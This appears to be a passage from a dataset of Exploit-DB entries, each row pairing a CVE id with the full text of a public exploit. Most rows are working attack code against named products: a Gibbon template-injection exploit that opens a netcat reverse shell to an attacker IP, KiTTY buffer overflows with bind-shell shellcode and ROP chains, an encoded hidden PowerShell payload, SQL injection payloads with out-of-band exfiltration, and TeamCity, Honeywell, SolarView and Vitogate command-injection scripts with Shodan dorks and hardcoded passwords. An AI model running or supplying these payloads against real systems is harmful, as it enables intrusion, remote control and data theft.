name=\""gibboni18nID\""\r\n\r\n0002\r\n-174475955731268836341556039466--\r\n"" r = requests.post(url, headers=headers, data=data, allowredirects=False) SessionCookie = re.split(r""\s+"", r.headers['Set-Cookie']) if SessionCookie[4] is not None and '/index.php' in str(r.headers['Location']): print(""login successful!"") return SessionCookie[4] def rce(cookie, targethost, targetport, attackerip, attackerport): url = f' <URL> headers = {""Content-Type"": ""multipart/form-data; boundary=-67142646631840027692410521651"", ""Cookie"": cookie} data = f""-67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""address\""\r\n\r\n/modules/School Admin/messengerSettings.php\r\n-67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""enableHomeScreenWidget\""\r\n\r\nY\r\n-67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""signatureTemplate\""\r\n\r\n{[\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attackerip} {attackerport} >/tmp/f']|filter('system')}\r\n-67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""messageBcc\""\r\n\r\n\r\n-67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""pinnedMessagesOnHome\""\r\n\r\nN\r\n-67142646631840027692410521651--\r\n"" r = requests.post(url, headers=headers, data=data, allowredirects=False) if 'success0' in str(r.headers['Location']): print(""Payload uploaded successfully!"") def trigger(cookie, targethost, targetport): url = f' <URL> headers = {""Cookie"": cookie} print(""RCE successful!"") r = requests.get(url, headers=headers, allowredirects=False) if name == 'main': if len(sys.argv) != 7: print(""Usage: script.py "") sys.exit(1) cookie = login(sys.argv[1], sys.argv[2],sys.argv[5],sys.argv[6]) rce(cookie, sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]) trigger(cookie, sys.argv[1], sys.argv[2])"
CVE-2023-48974,"{""CVE-2023-48974"": 1}",2024-04-02,Axigen &lt; 10.5.7 - Persistent Cross-Site Scripting,https://www.exploit-db.com/exploits/51963,"Exploit Title: Axigen < 10.5.7 - Persistent Cross-Site Scripting Date: 2023-09-25 Exploit Author: Vinnie McRae - RedTeamer IT Security Vendor Homepage: <URL> Software Link: <URL> Version: (10.5.7) and older version of Axigen WebMail Tested on: firefox, chrome CVE: CVE-2023-48974 Description The serverName_input parameter is vulnerable to stored cross-site scripting (XSS) due to unsanitized or unfiltered processing. This means that an attacker can inject malicious code into this parameter, which will then be executed by other users when they view the page where the parameter is used. This is affecting authenticated administrators, and the attack can be used to attack other administrators with more permissions. Exploitation 1. Login as administrator 2. Navigate to ""global settings"" 3. Change server name to"
CVE-2023-6538,"{""CVE-2023-6538"": 1}",2024-03-20,HNAS SMU 14.8.7825 - Information Disclosure,https://www.exploit-db.com/exploits/51915,"Exploit Title: Hitachi NAS (HNAS) System Management Unit (SMU) 14.8.7825 - Information Disclosure CVE: CVE-2023-6538 Date: 2023-12-13 Exploit Author: Arslan Masood () Vendor: <URL> Version: < 14.8.7825.01 Tested On: 13.9.7021.04 import argparse from os import getcwd import requests parser = argparse.ArgumentParser( description=""CVE-2023-6538"
CVE-2024-28595,"{""CVE-2024-28595"": 1}",2024-03-20,Employee Management System 1.0 - &#039;admin_id&#039; SQLi,https://www.exploit-db.com/exploits/51911,"Exploit Title: Employee Management System 1.0 - 'adminid' SQLi Date: 20-03-2024 Exploit Author: Shubham Pandey Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows, Linux CVE : CVE-2024-28595 Description: SQL Injection vulnerability in Employee Management System v1.0 allows attackers to run arbitrary SQL commands via the adminid parameter in update-admin.php."
CVE-2023-46022,"{""CVE-2023-46022"": 1}",2024-03-20,Blood Bank 1.0 - &#039;bid&#039; SQLi,https://www.exploit-db.com/exploits/51912,"Exploit Title: Blood Bank 1.0 - 'bid' SQLi Date: 2023-11-15 Exploit Author: Ersin Erenler Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0 CVE : CVE-2023-46022 Description: The 'bid' parameter in the /delete.php file of Code-Projects Blood Bank V1.0 is susceptible to Out-of-Band SQL Injection. This vulnerability stems from inadequate protection mechanisms, allowing attackers to exploit the parameter using Burp Collaborator to initiate OOB SQL injection attacks. Through this technique, an attacker can potentially extract sensitive information from the databases. Vulnerable File: /delete.php Parameter Name: bid Proof of Concept: 1. Intercept the request to cancel.php via Burp Suite 2. Inject the payload to the vulnerable parameters 3. Payload: 3'%2b(select%20loadfile(concat('\',version(),'.',database(),'.collaborator-domain\\a.txt')%2b' 4. Example request for bid parameter: GET /bloodbank/file/delete.php?bid=3'%2b(select%20loadfile(concat('\',version(),'.',database(),'.domain.oastify.com\\a.txt')%2b' HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: close Referer: <URL> Cookie: PHPSESSID= Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 5. Database and version information is seized via Burp Suite Collaborator"
CVE-2023-46024,"{""CVE-2023-46024"": 1}",2024-03-20,Teacher Subject Allocation Management System 1.0 - &#039;searchdata&#039; SQLi,https://www.exploit-db.com/exploits/51914,"Exploit Title: Teacher Subject Allocation Management System 1.0 - 'searchdata' SQLi Date: 2023-11-15 Exploit Author: Ersin Erenler Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0 CVE : CVE-2023-46024 Description: Teacher Subject Allocation Management System V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'searchdata' parameter in the index.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database. Vulnerable File: /index.php Parameter Name: searchdata Proof of Concept: Execute sqlmap using either the 'searchdata' parameter to retrieve the current database: sqlmap -u "" <URL> --method POST --data ""searchdata=test&search="" -p searchdata --risk 3 --level 3 --dbms mysql --batch --current-db SQLMap Response: Parameter: searchdata (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: searchdata=test%' AND 3912=3912 AND 'qxHV%'='qxHV&search= Type: error-based Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: searchdata=test%' AND (SELECT 1043 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(1043=1043,1),0x717a787171,FLOOR(RAND(0)*2))x FROM INFORMATIONSCHEMA.PLUGINS GROUP BY x)a) AND 'kewe%'='kewe&search= Type: stacked queries Title: MySQL >= 5.0.12 stacked queries (comment) Payload: searchdata=test%';SELECT SLEEP(5)#&search= Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: searchdata=test%' AND (SELECT 8862 FROM (SELECT(SLEEP(5)GqzT) AND 'wylU%'='wylU&search= Type: UNION query Title: Generic UNION query (NULL) - 15 columns Payload: searchdata=test%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170706a71,0x784e7a47626a794a74456975444c5a4c64734556414658476e75684c4a716f6173724b6b6a685163,0x717a787171)-- -&search="
CVE-2024-25003,"{""CVE-2024-25003"": 1}",2024-03-14,KiTTY 0.76.1.13 - &#039;Start Duplicated Session Hostname&#039; Buffer Overflow,https://www.exploit-db.com/exploits/51890,"Exploit Title: KiTTY 0.76.1.13 - 'Start Duplicated Session Hostname' Buffer Overflow Exploit Author: DEFCESCO (Austin A. DeFrancesco) Vendor Homepage: <URL> Software Link: <URL> Version: ≤ 0.76.1.13 Tested on: Microsoft Windows 11/10/8/7/XP CVE: 2024-25003 Blog: <URL> msf6 payload(windows/shellbindtcp) > tohandler # # [*] Payload Handler Started as Job 1 # msf6 payload(windows/shellbindtcp) > # # [*] Started bind TCP handler against 192.168.100.28:4444 # # [*] Command shell session 1 opened (192.168.100.119:39315 -> 192.168.100.28:4444) import sys import os import struct msf6 payload(windows/shellbindtcp) > generate -b '\x00\x07\x0a\x0d\x1b\x9c\x3A\x40' -f py # windows/shellbindtcp - 375 bytes # # <URL> # Encoder: x86/xorpoly # VERBOSE=false, LPORT=4444, RHOST=192.168.100.28, # PrependMigrate=false, EXITFUNC=process, CreateSession=true, # AutoVerifySession=true buf = b"""" buf += b""\x51\x53\x56\x57\xdb\xd9\xd9\x74\x24\xf4\x5f\x41"" buf += b""\x49\x31\xc9\x51\x59\x90\x90\x81\xe9\xae\xff\xff"" buf += b""\xff\xbe\xd4\xa1\xc4\xf4\x31\x77\x2b\x83\xef\xfc"" buf += b""\x51\x59\x90\xff\xc9\x75\xf3\x5f\x5e\x5b\x59\x28"" buf += b""\x49\x46\xf4\xd4\xa1\xa4\x7d\x31\x90\x04\x90\x5f"" buf += b""\xf1\xf4\x7f\x86\xad\x4f\xa6\xc0\x2a\xb6\xdc\xdb"" buf += b""\x16\x8e\xd2\xe5\x5e\x68\xc8\xb5\xdd\xc6\xd8\xf4"" buf += b""\x60\x0b\xf9\xd5\x66\x26\x06\x86\xf6\x4f\xa6\xc4"" buf += b""\x2a\x8e\xc8\x5f\xed\xd5\x8c\x37\xe9\xc5\x25\x85"" buf += b""\x2a\x9d\xd4\xd5\x72\x4f\xbd\xcc\x42\xfe\xbd\x5f"" buf += b""\x95\x4f\xf5\x02\x90\x3b\x58\x15\x6e\xc9\xf5\x13"" buf += b""\x99\x24\x81\x22\xa2\xb9\x0c\xef\xdc\xe0\x81\x30"" buf += b""\xf9\x4f\xac\xf0\xa0\x17\x92\x5f\xad\x8f\x7f\x8c"" buf += b""\xbd\xc5\x27\x5f\xa5\x4f\xf5\x04\x28\x80\xd0\xf0"" buf += b""\xfa\x9f\x95\x8d\xfb\x95\x0b\x34\xfe\x9b\xae\x5f"" buf += b""\xb3\x2f\x79\x89\xc9\xf7\xc6\xd4\xa1\xac\x83\xa7"" buf += b""\x93\x9b\xa0\xbc\xed\xb3\xd2\xd3\x5e\x11\x4c\x44"" buf += b""\xa0\xc4\xf4\xfd\x65\x90\xa4\xbc\x88\x44\x9f\xd4"" buf += b""\x5e\x11\x9e\xdc\xf8\x94\x16\x29\xe1\x94\xb4\x84"" buf += b""\xc9\x2e\xfb\x0b\x41\x3b\x21\x43\xc9\xc6\xf4\xc5"" buf += b""\xfd\x4d\x12\xbe\xb1\x92\xa3\xbc\x63\x1f\xc3\xb3"" buf += b""\x5e\x11\xa3\xbc\x16\x2d\xcc\x2b\x5e\x11\xa3\xbc"" buf += b""\xd5\x28\xcf\x35\x5e\x11\xa3\x43\xc9\xb1\x9a\x99"" buf += b""\xc0\x3b\x21\xbc\xc2\xa9\x90\xd4\x28\x27\xa3\x83"" buf += b""\xf6\xf5\x02\xbe\xb3\x9d\xa2\x36\x5c\xa2\x33\x90"" buf += b""\x85\xf8\xf5\xd5\x2c\x80\xd0\xc4\x67\xc4\xb0\x80"" buf += b""\xf1\x92\xa2\x82\xe7\x92\xba\x82\xf7\x97\xa2\xbc"" buf += b""\xd8\x08\xcb\x52\x5e\x11\x7d\x34\xef\x92\xb2\x2b"" buf += b""\x91\xac\xfc\x53\xbc\xa4\x0b\x01\x1a\x34\x41\x76"" buf += b""\xf7\xac\x52\x41\x1c\x59\x0b\x01\x9d\xc2\x88\xde"" buf += b""\x21\x3f\x14\xa1\xa4\x7f\xb3\xc7\xd3\xab\x9e\xd4"" buf += b""\xf2\x3b\x21"" def shellcode(): sc = b'' sc += b'\xBB\x44\x24\x44\x44' mov ebx,0x44442444 sc += b'\xB8\x44\x44\x44\x44' mov eax,0x44444444 sc += b'\x29\xD8' sub eax,ebx sc += b'\x29\xC4' sub esp,eax sc += buf sc += b'\x90' (1052-len(sc)) assert len(sc) == 1052 return sc def create_rop_chain(): rop chain generated with mona.py - <URL> rop_gadgets = [ #[-INFO:gadgets_to_set_esi:-] 0x004c5832, POP EAX ADD ESP,14 POP EBX POP ESI RETN [kitty.exe] 0x006424a4, ptr to &VirtualProtect() [IAT kitty.exe] 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x00484e07, MOV EAX,DWORD PTR DS:[EAX] RETN [kitty.exe] 0x00473cf6, XCHG EAX,ESI RETN [kitty.exe] #[-INFO:gadgets_to_set_ebp:-] 0x00429953, POP EBP RETN [kitty.exe] 0x005405b0, push esp; ret 0 [kitty.exe] #[-INFO:gadgets_to_set_ebx:-] 0x0049d9f9, POP EBX RETN [kitty.exe] 0x00000201, 0x00000201-> ebx #[-INFO:gadgets_to_set_edx:-] 0x00430dce, POP EDX RETN [kitty.exe] 0x00000040, 0x00000040-> edx #[-INFO:gadgets_to_set_ecx:-] 0x005ac58c, POP ECX RETN [kitty.exe] 0x004d81d9, # &Writable location [kitty.exe] #[-INFO:gadgets_to_set_edi:-] 0x004fa404, POP EDI RETN [kitty.exe] 0x005a2001, RETN (ROP NOP) [kitty.exe] #[-INFO:gadgets_to_set_eax:-] 0x004cd011, POP EAX POP EBX RETN [kitty.exe] 0x90909090, nop 0x41414141, Filler (compensate) #[-INFO:pushad:-] 0x005dfbac, PUSHAD RETN [kitty.exe] return b''.join(struct.pack('<I', _) for _ in rop_gadgets) rop_chain = create_rop_chain() Badchars: \x00\x07\x0a\x0d\x1b\x9c\x3A\x40 # Return Address Information: 0x0052033c : {pivot 332 / 0x14c} : # ADD ESP,13C POP EBX POP ESI POP EDI POP EBP RETN # # [kitty.exe] | startnull,ascii {PAGE_EXECUTE_READWRITE} # Shellcode size at ESP: 1052 return_address = struct.pack('<I', 0x0052033c) ADD ESP,13C POP EBX POP ESI POP EDI POP EBP RETN [kitty.exe] | startnull,ascii {PAGE_EXECUTE_READWRITE} rop_chain_padding = b'\x90' 35 nops = b'\x90' * 88 escapesequence = b'\033]0;dt:' + shellcode() + returnaddress escapesequence += ropchainpadding + ropchain escapesequence += b'\x90' escapesequence += b""\xE9\x2A\xFA\xFF\xFF"" jmp $eip-1490 escapesequence += nops + b'\007' stdout = os.fdopen(sys.stdout.fileno(), 'wb') stdout.write(escapesequence) stdout.flush()"
CVE-2024-23749,"{""CVE-2024-23749"": 1}",2024-03-14,KiTTY 0.76.1.13 - Command Injection,https://www.exploit-db.com/exploits/51892,"Exploit Title: KiTTY 0.76.1.13 - Command Injection Exploit Author: DEFCESCO (Austin A. DeFrancesco) Vendor Homepage: <URL> Software Link: <URL> Version: ≤ 0.76.1.13 Tested on: Microsoft Windows 11/10/8/7/XP CVE: CVE-2024-23749 Blog: <URL> msf6 payload(cmd/windows/powershellbindtcp) > tohandler # # [*] Payload Handler Started as Job 1 # msf6 payload(cmd/windows/powershellbindtcp) > # # [*] Started bind TCP handler against 192.168.100.28:4444 # # [*] Powershell session session 1 opened (192.168.100.119:36969 -> 192.168.100.28:4444) import os import sys msf6 payload(cmd/windows/powershellbindtcp) > generate -f raw shellcode = b'powershell.exe -nop -w hidden -noni -ep bypass ""&([scriptblock]::create' shellcode += b'((New-Object System.IO.StreamReader(New-Object System.IO.Compression.G' shellcode += b'zipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBa' shellcode += b'se64String(\'H4sIAE7efGUCA5VVTW/b{2}BC{1}+1cMD{2}1GQiTCDXoKkGJdNV0Ey' shellcode += b'LZGlTYHw0BoahxrQ5NekoptJP7vJSXqw3\'+\'GCbXWwJc7w8fHNG3JRCmYKKeBvNMktzh' shellcode += b'kvUBgYPA3APsGG\'+\'wQV8wU3ydf4vMgPJzW6NX+gK7aAhNj+t8ptk8l3jJ1zQkptUYW4' shellcode += b'jBeXa\'+\'QgRGld\'+\'hmTZTc7siLDDveG2lyB/vBoqG4lhtU{1}suygyo+oYquwvp{1' shellcode += b'}mhlViPtZkMrVioo8PhzNNGdSvBj8JDeCS5pXo5HHVJKh1u\'+\'AFWMm85{2}gI/hVGUK' shellcode += b'cUCwibZSDB/2A4L0Q+jKpgPa+aywttUKCy\'+\'k6fZzr6viFMtk+wBjSY3bH3tM2bv7XM' shellcode += b'8kWhDlXHr\'+\'+pWrqC/RRS{1}vzBiujQWsyxHWVPZv0VX4iErjMeMWulfy15inE7/QcB' shellcode += b'g76n6{1}Qa2ZNgrpyhGs8Yj1VlaNWWIdpbokNSNnj6GvQI+P1jxrwN6ghKxUhdmRrEkN/f' shellcode += b'pxsLA+wjh8Cm4s+h4SqmF6M{2}cbrqTBFJUpFgWjBn{1}QXuTUmS2lnM8pe5hF0St0yLg0' shellcode += b'S+dUN2ms{2}zECUXIeDw3X786GnkEfoFWm21lfuul8Z3A6mwXu35luRMjZyD7PfzyN{\'+' shellcode += b'\'1}l5dFHkTDqcGt4agYDJ3jj4/H2fp1VXkFP/ocsLhrbWm3GiYu{2}bJlsg5qFIImw\'+' shellcode += b'\'1Wj1Jbew7hFAIUj+fuS7jmPrVjtjRtgMnVujRd8E6kcr\'+\'1Txf3SQJhG8E/BlNRyY' shellcode += b'SCVai1VJSGBsVvMJWlQaLEfMSd34k5443k5yK0tBobdxuJR3H2Qax\'+\'T3Ztk3Tt{2}2' shellcode += b'fesc{2}ef3VJqezuDaQjpZfMuTlufvc21mfZbqkrKl5VyDQiHaI6XL6mi7Jzw4iSPS7LY+' shellcode += b'tBqk6PlKPMoHTC63a6uttnq3KPu+pTbLgmMYBkXlunoT35DmYe2xGEYxBAfsI0gEwuhI0k' shellcode += b'unH+Y3Vsu3LgXfmC6FVBpfes07FNte1FHpofnzodpd\'+\'IyoERfSimrYbXTGP{1}g1Jc' shellcode += b'7\'+\'jV4Gcf/nwHz/C1NEmNCt48B1BnUAnSAJ/CySSDE/tf6X8tWeXhiEyoWbroBzjpQL' shellcode += b'a{2}SIBKSTUdzQ4W67Gu4oRxpCqMXmNw0f+wrbYdHBv4l/zbwfyvY/uGPfJrM+czL/Wyve' shellcode += b'/8weMP85RLjX4/VTs2t1DfMN3VlBm5bu4j/2ud2V7lbe3cFfoTVXnPBo0IAAA{0}\')-f' shellcode += b'\'=\',\'9\',\'O\'),[System.IO.Compression.CompressionMode]::Decompr' shellcode += b'ess).ReadToEnd()\""' escapesequence = b'\033]0;rv:' escapesequence += b'"" & ' escapesequence += shellcode escapesequence += b' #\007' stdout = os.fdopen(sys.stdout.fileno(), 'wb') stdout.write(escapesequence) stdout.flush()"
CVE-2024-25004,"{""CVE-2024-25004"": 1}",2024-03-14,KiTTY 0.76.1.13 - &#039;Start Duplicated Session Username&#039; Buffer Overflow,https://www.exploit-db.com/exploits/51891,"Exploit Title: KiTTY 0.76.1.13 - 'Start Duplicated Session Username' Buffer Overflow Exploit Author: DEFCESCO (Austin A. DeFrancesco) Vendor Homepage: <URL> Software Link: <URL> Version: ≤ 0.76.1.13 Tested on: Microsoft Windows 11/10/8/7/XP CVE: CVE-2024-25004 Blog: <URL> msf6 payload(windows/shellbindtcp) > tohandler # # [*] Payload Handler Started as Job 1 # msf6 payload(windows/shellbindtcp) > # # [*] Started bind TCP handler against 192.168.100.28:4444 # # [*] Command shell session 1 opened (192.168.100.119:34285 -> 192.168.100.28:4444) import sys import os import struct msf6 payload(windows/shellbindtcp) > generate -b '\x00\x07\x0a\x0d\x1b\x9c' -f py # windows/shellbindtcp - 355 bytes # # <URL> # Encoder: x86/shikataganai # VERBOSE=false, LPORT=4444, RHOST=192.168.100.28, # PrependMigrate=false, EXITFUNC=process, CreateSession=true, # AutoVerifySession=true buf = b"""" buf += b""\xd9\xe9\xd9\x74\x24\xf4\xbd\xfe\xb7\xa4\x99\x5e"" buf += b""\x29\xc9\xb1\x53\x83\xee\xfc\x31\x6e\x13\x03\x90"" buf += b""\xa4\x46\x6c\x90\x23\x04\x8f\x68\xb4\x69\x19\x8d"" buf += b""\x85\xa9\x7d\xc6\xb6\x19\xf5\x8a\x3a\xd1\x5b\x3e"" buf += b""\xc8\x97\x73\x31\x79\x1d\xa2\x7c\x7a\x0e\x96\x1f"" buf += b""\xf8\x4d\xcb\xff\xc1\x9d\x1e\xfe\x06\xc3\xd3\x52"" buf += b""\xde\x8f\x46\x42\x6b\xc5\x5a\xe9\x27\xcb\xda\x0e"" buf += b""\xff\xea\xcb\x81\x8b\xb4\xcb\x20\x5f\xcd\x45\x3a"" buf += b""\xbc\xe8\x1c\xb1\x76\x86\x9e\x13\x47\x67\x0c\x5a"" buf += b""\x67\x9a\x4c\x9b\x40\x45\x3b\xd5\xb2\xf8\x3c\x22"" buf += b""\xc8\x26\xc8\xb0\x6a\xac\x6a\x1c\x8a\x61\xec\xd7"" buf += b""\x80\xce\x7a\xbf\x84\xd1\xaf\xb4\xb1\x5a\x4e\x1a"" buf += b""\x30\x18\x75\xbe\x18\xfa\x14\xe7\xc4\xad\x29\xf7"" buf += b""\xa6\x12\x8c\x7c\x4a\x46\xbd\xdf\x03\xab\x8c\xdf"" buf += b""\xd3\xa3\x87\xac\xe1\x6c\x3c\x3a\x4a\xe4\x9a\xbd"" buf += b""\xad\xdf\x5b\x51\x50\xe0\x9b\x78\x97\xb4\xcb\x12"" buf += b""\x3e\xb5\x87\xe2\xbf\x60\x3d\xea\x66\xdb\x20\x17"" buf += b""\xd8\x8b\xe4\xb7\xb1\xc1\xea\xe8\xa2\xe9\x20\x81"" buf += b""\x4b\x14\xcb\xbc\xd7\x91\x2d\xd4\xf7\xf7\xe6\x40"" buf += b""\x3a\x2c\x3f\xf7\x45\x06\x17\x9f\x0e\x40\xa0\xa0"" buf += b""\x8e\x46\x86\x36\x05\x85\x12\x27\x1a\x80\x32\x30"" buf += b""\x8d\x5e\xd3\x73\x2f\x5e\xfe\xe3\xcc\xcd\x65\xf3"" buf += b""\x9b\xed\x31\xa4\xcc\xc0\x4b\x20\xe1\x7b\xe2\x56"" buf += b""\xf8\x1a\xcd\xd2\x27\xdf\xd0\xdb\xaa\x5b\xf7\xcb"" buf += b""\x72\x63\xb3\xbf\x2a\x32\x6d\x69\x8d\xec\xdf\xc3"" buf += b""\x47\x42\xb6\x83\x1e\xa8\x09\xd5\x1e\xe5\xff\x39"" buf += b""\xae\x50\x46\x46\x1f\x35\x4e\x3f\x7d\xa5\xb1\xea"" buf += b""\xc5\xd5\xfb\xb6\x6c\x7e\xa2\x23\x2d\xe3\x55\x9e"" buf += b""\x72\x1a\xd6\x2a\x0b\xd9\xc6\x5f\x0e\xa5\x40\x8c"" buf += b""\x62\xb6\x24\xb2\xd1\xb7\x6c"" def shellcode(): sc = b'' sc += b'\xBB\x44\x24\x44\x44' mov ebx,0x44442444 sc += b'\xB8\x44\x44\x44\x44' mov eax,0x44444444 sc += b'\x29\xD8' sub eax,ebx sc += b'\x29\xC4' sub esp,eax sc += buf sc += b'\x90' * (1042-len(sc)) assert len(sc) == 1042 return sc def createropchain(): rop chain generated with mona.py - <URL> ropgadgets = [ #[-INFO:gadgetstosetesi:-] 0x004c5832, POP EAX ADD ESP,14 POP EBX POP ESI RETN [kitty.exe] 0x006424a4, ptr to &VirtualProtect() [IAT kitty.exe] 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x41414141, Filler (compensate) 0x00484e07, MOV EAX,DWORD PTR DS:[EAX] RETN [kitty.exe] 0x00473cf6, XCHG EAX,ESI RETN [kitty.exe] #[-INFO:gadgetstosetebp:-] 0x00429953, POP EBP RETN [kitty.exe] 0x005405b0, PUSH ESP; RETN 0 [kitty.exe] #[-INFO:gadgetstosetebx:-] 0x0049d9f9, POP EBX RETN [kitty.exe] 0x00000201, 0x00000201-> ebx #[-INFO:gadgetstosetedx:-] 0x00430dce, POP EDX RETN [kitty.exe] 0x00000040, 0x00000040-> edx #[-INFO:gadgetstosetecx:-] 0x005ac58c, POP ECX RETN [kitty.exe] 0x004d81d9, # &Writable location [kitty.exe] #[-INFO:gadgetstosetedi:-] 0x004fa404, POP EDI RETN [kitty.exe] 0x005a2001, RETN (ROP NOP) [kitty.exe] #[-INFO:gadgetstoseteax:-] 0x004cd011, POP EAX POP EBX RETN [kitty.exe] 0x90909090, nop 0x41414141, Filler (compensate) #[-INFO:pushad:-] 0x005dfbac, PUSHAD RETN [kitty.exe] return b''.join(struct.pack('<I', ) for in ropgadgets) ropchain = createropchain() Badchars: \x00\x07\x0a\x0d\x1b\x9c\x9d # Return Address Information: 0x00529720 : {pivot 324 / 0x144} : # ADD ESP,134 POP EBX POP ESI POP EDI POP EBP RETN # # ** [kitty.exe] ** | startnull {PAGEEXECUTEREADWRITE} # Shellcode size at ESP: 1042 bytes returnaddress = struct.pack('<I', 0x00529720) ADD ESP,134 POP EBX POP ESI POP EDI POP EBP RETN [kitty.exe] | startnull {PAGEEXECUTEREADWRITE} ropchainpadding = b'\x90' 27 nops = b'\x90' 88 escapesequence = b'\033]0;dt:localhost:' + shellcode() + returnaddress escapesequence += ropchainpadding + ropchain escapesequence += b'\xE9\x3D\xFA\xFF\xFF' jmp $eip-1471 escapesequence += nops + b'\007' stdout = os.fdopen(sys.stdout.fileno(), 'wb') stdout.write(escape_sequence) stdout.flush()"
CVE-2023-42793,"{""CVE-2023-42793"": 1}",2024-03-14,JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51884,"#- Exploit Title: JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE) #- Shodan Dork: http.title:TeamCity , http.favicon.hash:-1944119648 #- Exploit Author: ByteHunter #- Vendor: JetBrains #- Email: 0xByteHunter.me #- vendor: JetBrains #- Version: versions before 2023.05.4 #- Tested on: 2023.05.3 #- CVE : CVE-2023-42793 import requests import argparse import re import random import string import subprocess banner = "" CVE-2023-42793 TeamCity Admin Account Creation Author: ByteHunter print(banner) parser = argparse.ArgumentParser(description=""CVE-2023-42793 - TeamCity JetBrains"
CVE-2023-3710,"{""CVE-2023-3710"": 1}",2024-03-14,Honeywell PM43 &lt; P10.19.050004 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51885,"#- Exploit Title: Honeywell PM43 < P10.19.050004 - Remote Code Execution (RCE) #- Shodan Dork: http.title:PM43 , PM43 #- Exploit Author: ByteHunter #- Email: 0xByteHunter.me #- Frimware Version: versions prior to P10.19.050004 #- Tested on: P10.17.019667 #- CVE : CVE-2023-3710 import requests import argparse BLUE = '\033[94m' YELLOW = '\033[93m' RESET = '\033[0m' def banner(): banner = "" CVE-2023-3710 Command Injection in Honeywell PM43 Printers Author: ByteHunter print(YELLOW + banner + RESET) def runcommand(url, command): fullurl = f""{url}/loadfile.lp?pageid=Configure"" payload = { 'username': f'hunt\n{command}\n', 'userpassword': 'admin12345admin!!' try: response = requests.post(fullurl, data=payload, verify=False) responsetext = response.text htmlstartindex = responsetext.find(' ') if htmlstartindex != -1: return responsetext[:htmlstartindex] else: return response_text except requests.exceptions.RequestException as e: return f""Error: {e}"" def main(): parser = argparse.ArgumentParser(description='Command Injection"
CVE-2023-23333,"{""CVE-2023-23333"": 1}",2024-03-14,SolarView Compact 6.00 - Command Injection,https://www.exploit-db.com/exploits/51886,"#- Exploit Title: SolarView Compact 6.00 - Command Injection #- Shodan Dork: http.html:""solarview compact"" #- Exploit Author: ByteHunter #- Email: 0xByteHunter.me #- Version: 6.00 #- Tested on: 6.00 #- CVE : CVE-2023-23333 import argparse import requests def vulncheck(ipaddress, port): url = f"" <URL> response = requests.get(url) if response.statuscode == 200: output = response.text if ""root"" in output: print(""Vulnerability detected: Command Injection possible."") print(f""passwd file content:\n{response.text}"") else: print(""No vulnerability detected."") else: print(""Error: Unable to fetch response."") def main(): parser = argparse.ArgumentParser(description=""SolarView Compact Command Injection "") parser.addargument(""-i"", ""--ip"", help=""IP address of the target device"", required=True) parser.addargument(""-p"", ""--port"", help=""Port of the the target device (default: 80)"", default=80, type=int) args = parser.parseargs() ipaddress = args.ip port = args.port vulncheck(ipaddress, port) if name == ""main"": main()"
CVE-2023-5702,"{""CVE-2023-5702"": 1}",2024-03-14,Viessmann Vitogate 300 2.1.3.0 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51887,"#- Exploit Title: Viessmann Vitogate 300 <= 2.1.3.0 - Remote Code Execution (RCE) #- Shodan Dork: http.title:'Vitogate 300' #- Exploit Author: ByteHunter #- Email: 0xByteHunter.me #- Version: versions up to 2.1.3.0 #- Tested on: 2.1.1.0 #- CVE : CVE-2023-5702 & CVE-2023-5222 import argparse import requests def banner(): banner = "" CVE-2023-5702 Vitogate 300 RCE Author: ByteHunter print(banner) def sendpostrequest(targetip, command, targetport): payload = { ""method"": ""put"", ""form"": ""form-4-7"", ""session"": """", ""params"": { ""ipaddr"": f""1;{command}"" headers = { ""Host"": targetip, ""Content-Length"": str(len(str(payload), ""Content-Type"": ""application/json"" url = f"" <URL> response = requests.post(url, json=payload, headers=headers) if response.statuscode == 200: print(""Result:"") print(response.text) else: print(f""Request failed! status code: {response.statuscode}"") def main(): parser = argparse.ArgumentParser(description=""Vitogate 300 RCE & Hardcoded Credentials"") parser.addargument(""--target"", required=False, help=""Target IP address"") parser.addargument(""--port"", required=False, help=""Target port"",default=""80"") parser.addargument(""--command"", required=False, help=""Command"") parser.addargument(""--creds"", action=""storetrue"", help=""Show hardcoded credentials"") args = parser.parseargs() if args.creds: print(""Vitogate 300 hardcoded administrative accounts credentials"") print(""Username: vitomaster, Password: viessmann1917"") print(""Username: vitogate, Password: viessmann"") else: targetip = args.target targetport = args.port command = args.command if 